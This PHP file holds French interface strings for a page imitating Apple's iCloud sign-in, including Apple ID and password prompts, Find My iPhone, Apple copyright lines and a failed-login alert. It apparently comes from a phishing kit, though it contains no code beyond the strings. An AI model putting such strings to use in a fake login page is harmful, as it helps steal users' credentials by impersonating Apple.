<?php
/*
------------------
Language: Frensh
------------------
*/
 
$lang = array();
// Header
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'Comment configurer iCloud';
// login form
$lang['SIGN_IN_TITLE'] = 'Connexion à iCloud';
$lang['APPLE_ID'] = 'Identifiant Apple';
$lang['PASSWORD'] = 'Mot de passe';
$lang['KEEP_ME'] = 'Rester connecté';
$lang['FORGOT_ID'] = 'Identifiant Apple ou mot de passe oublié ?';
$lang['DONT_HAVE_ID'] = 'Pas d’identifiant Apple ? ';
$lang['CREATE_YOURS'] = 'Créez le vôtre dès maintenant.';
// Footer
$lang['CHECK_ACTIVATION'] = 'État du verrouillage d’activation';
$lang['SYSTEM_STATUS'] = 'État du système';
$lang['POLICY'] = 'Engagement de confidentialité';
$lang['TERMS'] = 'Conditions générales';
$lang['COPYRIGHT'] = 'Copyright © 2016 Apple Inc. Tous droits réservés.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Localiser mon iPhone';
$lang['MOB_APPLE_ID'] = 'Identifiant Apple';
$lang['MOB_EXAMPLE'] = 'exemple@icloud.com';
$lang['MOB_PASSWORD'] = 'Mot de passe';
$lang['MOB_REQUIRED'] = 'requis';
$lang['MOB_LOGIN'] = 'Se connecter...';
$lang['MOB_FORGOT_ID'] = 'Id. Apple ou mot de passe oublié ?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'Instruction de configuration';
$lang['MOB_locating'] = 'Localisation...';
$lang['IDPWD_ERROR_ALERT1'] = 'Échec de la vérification';
$lang['IDPWD_ERROR_ALERT2'] = 'Votre identifiant Apple ou votre mot de passe est incorrect.';
?>